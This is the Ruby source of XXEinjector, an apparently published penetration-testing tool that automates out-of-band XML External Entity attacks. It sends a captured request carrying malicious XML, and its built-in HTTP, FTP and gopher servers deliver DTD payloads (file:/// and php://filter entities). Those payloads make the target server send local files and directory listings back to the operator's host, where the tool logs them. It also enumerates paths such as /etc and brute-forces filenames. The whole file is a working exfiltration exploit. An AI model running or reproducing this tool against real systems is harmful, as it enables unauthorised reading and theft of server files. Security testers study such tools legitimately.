#!/usr/bin/env ruby

require 'socket'
require 'fileutils'
require 'cgi'
require 'uri'
require 'net/http'
require 'net/https'
require 'base64'

# CONFIGURE
host = "" # our external ip
path = "" # path to enumerate
$file = "" # file with vulnerable HTTP request
enum = "ftp" # which out of band protocol should be used for file retrieval - ftp/http

$proto = "http" # protocol to use - http/https
$proxy = "" # proxy host
$proxy_port = "" # proxy port

phpfilter = "n" # if yes php filter will be used to base64 encode file content - y/n
enumall = "n" # if yes XXEinjector will not ask what to enum (prone to false positives) - y/n
brute = "n" # if filenames should be taken from brute.txt - y/n
bfile = "" # file with paths to bruteforce

$verbose = "n" # verbose messaging
timeout = 10 # timeout for receiving responses

http_port = 80 # http port that receives file contents/directory listings and serves XML files
ftp_port = 21 # ftp port that receives file contents/directory listings
gopher_port = 70 # gopher port that receives file contents/directory listings

# set all variables
ARGV.each do |arg|
	host = arg.split("=")[1] if arg.include?("--host=")
	path = arg.split("=")[1] if arg.include?("--path=")
	$file = arg.split("=")[1] if arg.include?("--file=")
	enum = arg.split("=")[1] if arg.include?("--oob=")
	$proto = "https" if arg.include?("--ssl")
	$proxy = arg.split("=")[1].split(":")[0] if arg.include?("--proxy=")
	$proxy_port = arg.split("=")[1].split(":")[1] if arg.include?("--proxy=")
	phpfilter = "y" if arg.include?("--phpfilter")
	enumall = "y" if arg.include?("--fast")
	brute = "y" if arg.include?("--brute=")
	bfile = arg.split("=")[1] if arg.include?("--brute=")
	$verbose = "y" if arg.include?("--verbose")
	http_port = arg.split("=")[1] if arg.include?("--httpport=")
	ftp_port = arg.split("=")[1] if arg.include?("--ftpport=")
	gopher_port = arg.split("=")[1] if arg.include?("--gopherport=")
	timeout = arg.split("=")[1] if arg.include?("--timeout=")
end

# show sample request file
if ARGV.include? "--xml"
	puts ""
	puts "POST /parsexml.php HTTP/1.1"
	puts "Host: 192.168.0.1:8080"
	puts "Content-Type: application/xml"
	puts "Content-Length: 215"
	puts ""
	puts "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
	puts "<!DOCTYPE x [ <!ENTITY % remote SYSTEM \"http://192.168.0.2:88/file.dtd\"> %remote;%int;%trick;]>"
	puts ""
	exit(1)
end

# show main menu
if ARGV.nil? || ARGV.size < 3 || host == "" || $file == "" || (path == "" && bfile == "")
	puts "XXEinjector by Jakub Palaczynski"
	puts ""
	puts "XXEinjector automates retrieving files using out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications."
	puts ""
	puts "Options:"
	puts "  --host	Mandatory - our IP address for reverse connections. (--host=192.168.0.2)"
	puts "  --path	Mandatory (or --brute) - Path to enumerate. (--path=/etc)"
	puts "  --file	Mandatory - File containing HTTP request. Entity in request file needs to point to file.dtd on XXEinjector HTTP server. Issue --xml to show sample HTTP request. (--file=/tmp/req.txt)"
	puts "  --brute	Mandatory (or --path) - File with paths to bruteforce. (--brute=/tmp/brute.txt)"
	puts ""
	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
	puts "  --phpfilter		Use PHP filter to base64 encode target file before sending."
	puts ""
	puts "  --ssl		Use SSL."
	puts "  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)"
	puts "  --httpport	Set custom HTTP port. (--httpport=80)"
	puts "  --ftpport	Set custom FTP port. (--ftpport=21)"
	puts "  --gopherport	Set custom gopher port. (--gopherport=70)"
	puts ""
	puts "  --timeout	Timeout for receiving file/directory content. (--timeout=20)"
	puts "  --fast	Skip asking what to enumerate. Prone to false-positives."
	puts "  --verbose	Show verbose messages."
	puts ""
	puts "Example usage:"
	puts "  Enumerating /etc directory using HTTPS protocol with proxy:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl --proxy=127.0.0.1:8080"
	puts "  Enumerating /etc directory using HTTP protocol:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt"
	puts "  Bruteforcing files:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt"
	puts ""
	exit(1)
else
	puts "XXEinjector by Jakub Palaczynski"
	puts ""
end

# EXECUTION
ftp = TCPServer.new ftp_port
http = TCPServer.new http_port
gopher = TCPServer.new gopher_port

# regex to find directory listings
regex = /^[$.\-_~ 0-9A-Za-z]+$/
# array that holds filenames to enumerate
filenames = Array.new
# temp path holders - hold next filenames in different format being enumerated
nextpath = ""
enumpath = ""
# array that contains skipped paths
blacklist = Array.new
# other variables
$port = 0 # remote host application port - fill if HTTP/1.0 is used
$remote = "" # remote host URL/IP address - fill if HTTP/1.0 is used
$method = "post" # HTTP method - get/post
cmp = "" # holds user input
switch = 0 # this switch locks enumeration if response is pending
i = 0 # main counter

### Processing Request File ###
def sendreq()

	# check HTTP method
	if File.readlines($file)[0].include?("GET ")
		$method = "get"
	end

	# get URI path
	uri = File.readlines($file)[0].split(" ")[1]

	# get connection host and port
	i = 1
	loop do
		break if File.readlines($file)[i].chomp.empty?
		if File.readlines($file)[i].include?("Host: ")
			$remote = File.readlines($file)[i].split(" ")[1]
			if $proto == "http"
				$port = 80
			else
				$port = 443
			end
			if $remote.include?(":")
				$port = $remote.split(":")[1]
				$remote = $remote.split(":")[0]
			end
		end
		i = i + 1
	end

	# get headers
	i = 1
	headers = Hash.new
	loop do
		break if File.readlines($file)[i].chomp.empty?
		if !File.readlines($file)[i].include?("Host: ")
			header = File.readlines($file)[i].chomp
			headers[header.split(": ")[0]] = header.split(": ")[1]
		end
		i = i + 1
	end

	# get POST body
	i = i + 1
	post = ""
	if $method == "post"
		loop do
			break if File.readlines($file)[i].nil?
			postline = File.readlines($file)[i]
			post += postline
			i = i + 1
		end
	end

	# set proxy
	if $proxy == ""
		$proxy = nil
		$proxy_port = nil
	end

	# sending request
	request = Net::HTTP.new($remote, $port, $proxy, $proxy_port)
	if $verbose == "y"
		puts "Sending request with malicious XML:"
		if $proto == "http"
			puts "http://#{$remote}:#{$port}#{uri}"
			puts headers
			puts "\n"
			puts post
			puts "\n"
		else
			puts "https://#{$host}:#{$port}#{uri}"
			puts headers
			puts "\n"
			puts post
			puts "\n"
		end
	else
		puts "Sending request with malicious XML"
	end

	# set HTTPS
	if $proto == "https"
		request.use_ssl = true
		request.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end
	request.start { |r|
		begin
			status = Timeout::timeout(5) {
    				if $method == "post"
					r.post(uri, post, headers) 
				else
					r.get(uri, headers)
				end
  			}
		rescue Timeout::Error
		end
	}
end
### End of Processing Request File ###

# Remove first slash if unix-like path specified
cut = 0
if path[0] == "/"
	path[0] = ''
	cut = 1
end

# Sending first request with path specified
if brute == "n"
	enumpath = path
	sendreq()
end

# HTTP for XML serving and data retrival
Thread.start do
loop do
  Thread.start(http.accept) do |client|
	done = 0
	tmppath = nextpath
	loop {

		params = {}
		req = client.gets()
		break if req.nil?

		# HTTP XML serving
		if req.include? "file.dtd"

			puts "Request for XML:\n#{req}" if $verbose == "y"

			if cut == 1
				puts "Responding with XML for: /#{enumpath}"
			else
				puts "Responding with XML for: #{enumpath}"
			end

			# respond with proper XML
			if enum == "ftp"
				if phpfilter == "n"
					payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
					client.puts("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: keep-alive\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				else
					payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
					client.puts("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: keep-alive\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				end
			elsif enum == "http"
				if phpfilter == "n"
					payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
					client.puts("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: keep-alive\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				else
					payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
					client.puts("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: keep-alive\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				end
			elsif enum == "gopher"
				payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'gopher://#{host}:#{gopher_port}/?gopher=%payl;'>\">"
				client.puts("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: keep-alive\r\nContent-Type: application/xml\r\n\r\n#{payload}")
			end
			puts "XML payload sent: #{payload}" if $verbose == "y"

		end

		# HTTP data retrival
		if req.include? "?p="

			puts "Request with file/directory content:\n#{req}" if $verbose == "y"
			
			# retrieve p parameter value and respond
			temp = req.split("?")[1].split(" ")[0].split("&")
			temp.each {|t|
          			x = t.split("=")
          			params[x[0].to_sym] = CGI::unescape(x[1].gsub("+", "%20"))
        		}
			req = "#{params[:p]}"
			client.puts("HTTP/1.1 200 OK\r\nContent-Length: 6\r\nConnection: keep-alive\r\nContent-Type: plain/text\r\n\r\nThanks")

			# base64 decode if parameter was encoded
			if phpfilter == "y"
				req = Base64.decode64(req)
			end

			req.split("\n").each do |param|

				# log to separate file or brute.log if in bruteforce mode
				if brute == "n"
					logpath = "#{path}"
					if tmppath != ""
						if cut == 1
							logpath += "/"
						else
							logpath += "\\"
						end
					end
					logpath += "#{tmppath}"
					logpath = logpath.gsub('\\','/')
					if tmppath != ""
						FileUtils.mkdir_p logpath.split("/")[0..-2].join('/')
					else
						if logpath.include?("/")
							FileUtils.mkdir_p logpath.split("/")[0..-2].join('/')
						else
							FileUtils.mkdir_p logpath
						end
					end
					if  done == 0
						if cut == 1
							puts "Successfully logged file: /#{logpath}"
							done = 1
							switch = 0
							puts "Enumeration unlocked" if $verbose == "y"
						else
							puts "Successfully logged file: #{logpath}"
							done = 1
							switch = 0
							puts "Enumeration unlocked" if $verbose == "y"
						end
					end
					log = File.open( "#{logpath}.log", "a")
					log.write param + "\n"
					log.close
				else
					log = File.open( "brute.log", "a")
					log.write param + "\n"
					puts "Bruteforced request logged: #{param}" if $verbose == "y"
					log.close
				end	

				# push to array if directory listing is detected for further enumeration
				if brute == "n"
					param = param.chomp
					if param.match regex
						logp = tmppath
						if tmppath != ""
							if cut == 1
								logp += "/"
							else
								logp += "\\"
							end
						end
						logp += param
						filenames.push(logp)
						puts "Path pushed to array: #{logp}" if $verbose == "y"
					end
				end
			end
		end

	}
  end
end
end

# FTP server to read files/directory listings and log to files
Thread.start do
loop do
  Thread.start(ftp.accept) do |client|
	done = 0
	switch = 0
	puts "Enumeration unlocked" if $verbose == "y"
	tmppath = nextpath
	client.puts("220 XXEinjector Welcomes!")
	loop {
		req = client.gets()
		break if req.nil?

		# respond with proper option
		if req.include? "LIST"
			client.puts("drwxrwxrwx 1 xxe xxe          1 Jan 01 01:01 xxe")
			client.puts("150 Opening BINARY mode data connection for /xxe")
			client.puts("226 Transfer complete")
		end
		if req.include? "USER"
			client.puts("331 password required")
		end
		if req.include? "PORT"
			client.puts("200 PORT command OK")
		else
			client.puts("230 Now you can send data")
		end
	
		# truncate requests to proper format and base64 decode if encoded
		if req.include? "RETR "
			req = req.split(' ')[1..-1].join(' ')
			req += "\n"
		end

		if phpfilter == "y"
			req = Base64.decode64(req)
		end
		
		# log to separate file or brute.log if in bruteforce mode
		if brute == "n"
			logpath = ""
			logpath += "#{path}"
			if tmppath != ""
				if cut == 1
					logpath += "/"
				else
					logpath += "\\"
				end
			end
			logpath += "#{tmppath}"
			logpath = logpath.gsub('\\','/')
			if tmppath != ""
				FileUtils.mkdir_p logpath.split("/")[0..-2].join('/')
			else
				if logpath.include?("/")
					FileUtils.mkdir_p logpath.split("/")[0..-2].join('/')
				else
					FileUtils.mkdir_p logpath
				end
			end
			if  done == 0
				if cut == 1
					puts "Successfully logged file: /#{logpath}"
					done = 1
				else
					puts "Successfully logged file: #{logpath}"
					done = 1
				end
			end
			log = File.open( "#{logpath}.log", "a")
			log.write req
			log.close
		else
			log = File.open( "brute.log", "a")
			log.write req
			puts "Bruteforced request logged: #{req}" if $verbose == "y"
			log.close
		end

		# clear requests that are known to be not part of directory listing
		req = req.chomp
		if req.match(/^USER /)
			req = ""
		end
		if req.match(/^PASS /)
			req = ""
		end
		if req == "TYPE I"
			req = ""
		end
		if req.include? "EPSV"
			req = ""
		end

		# push to array if directory listing is detected for further enumeration
		if brute == "n"
			if req.match regex
				logp = tmppath
				if tmppath != ""
					if cut == 1
						logp += "/"
					else
						logp += "\\"
					end
				end
				logp += req
				filenames.push(logp)
				puts "Path pushed to array: #{logp}" if $verbose == "y"
			end
		end

	}
  end
end
end

# gopher server to read files/directory listings and log to files
Thread.start do
loop do
  Thread.start(gopher.accept) do |client|
	done = 0
	switch = 0
	puts "Enumeration unlocked" if $verbose == "y"
	tmppath = nextpath
	loop {
		req = ""
		loop do
			tmp = client.gets()
			break if tmp.chomp == ""
			req += tmp
		end

		req.sub! 'gopher=', ''
		req.split("\n").each do |param|

			# log to separate file or brute.log if in bruteforce mode
			if brute == "n"
				logpath = ""
				logpath += "#{path}"
				if tmppath != ""
					if cut == 1
						logpath += "/"
					else
						logpath += "\\"
					end
				end
				logpath += "#{tmppath}"
				logpath = logpath.gsub('\\','/')
				if tmppath != ""
					FileUtils.mkdir_p logpath.split("/")[0..-2].join('/')
				else
					if logpath.include?("/")
						FileUtils.mkdir_p logpath.split("/")[0..-2].join('/')
					else
						FileUtils.mkdir_p logpath
					end
				end
				if  done == 0
					if cut == 1
						puts "Successfully logged file: /#{logpath}"
						done = 1
					else
						puts "Successfully logged file: #{logpath}"
						done = 1
					end
				end
				log = File.open( "#{logpath}.log", "a")
				log.write param + "\n"
				log.close
			else
				log = File.open( "brute.log", "a")
				log.write param + "\n"
				puts "Bruteforced request logged: #{param}" if $verbose == "y"
				log.close
			end
		
			# push to array if directory listing is detected for further enumeration
			if brute == "n"
				if param.match regex
					logp = tmppath
					if tmppath != ""
						if cut == 1
							logp += "/"
						else
							logp += "\\"
						end
					end
						logp += param
					filenames.push(logp)
					puts "Path pushed to array: #{logp}" if $verbose == "y"
				end
			end
		end

	}
  end
end
end

# read, ask and further enumerate
loop do
	if brute == "n"
		if !filenames[i].nil?
		
			# Read next line
			line = filenames[i]
			line = line.chomp
			line = line.gsub(' ','+')
		
			# Check if a file should be enumerated
			if cut == 1
				check = "#{path}/#{line}".split("/")[0..-2].join('/')
			else
				check = "#{path}\\#{line}".split("\\")[0..-2].join('\\')
			end
			if enumall != "y" && !blacklist.include?(check)
				if cut == 0
					puts "Enumerate #{path}\\#{line} ? y(yes)/n(no)/s(skip all files in this directory)"
				else
					puts "Enumerate /#{path}/#{line} ? y(yes)/n(no)/s(skip all files in this directory)"
				end
				cmp = $stdin.gets.chomp
				if cmp == "s"
					if cut == 0
						blacklist.push("#{path}\\#{line}".split("\\")[0..-2].join('\\'))
					
					else
						blacklist.push("#{path}/#{line}".split("/")[0..-2].join('/'))
					end
				end
			elsif	enumall == "y"
				cmp = "y"
			else 
				cmp = "n"
			end
			if cmp == "y"
				if enumall != "y"
					switch = 1
					puts "Enumeration locked" if $verbose == "y"
				end
				nextpath = "#{line}"
	
				# Send request with next filename
				if cut == 1
					enumpath = "#{path}/#{line}"
					sendreq()
				else
					enumpath = "#{path}\\#{line}"
					sendreq()
				end

				# Loop that checks if response with next file content was received by FTP/HTTP servers
				loop do
					sleep timeout
					if switch == 1
						puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? w/n"
						cmp = $stdin.gets.chomp
						break if cmp == "n"
						sleep timeout
					else
						break
					end
				end

			end
			i = i + 1
		end
	else
		brutefile = File.open(bfile, "r")
		if !IO.readlines(brutefile)[i].nil?
		
			# Read next line
			line = IO.readlines(brutefile)[i]
			line = line.chomp

			log = File.open( "brute.log", "a")
			log.write "\n"
			log.write "Filename: #{line}\n"
			log.close

			if line[0] == "/"
				line[0] = ''
			end

			line = line.gsub(' ','+')

			# Send request with next filename
			enumpath = "#{line}"
			sendreq()

			i = i + 1

		end
		brutefile.close
		sleep timeout
	end
end
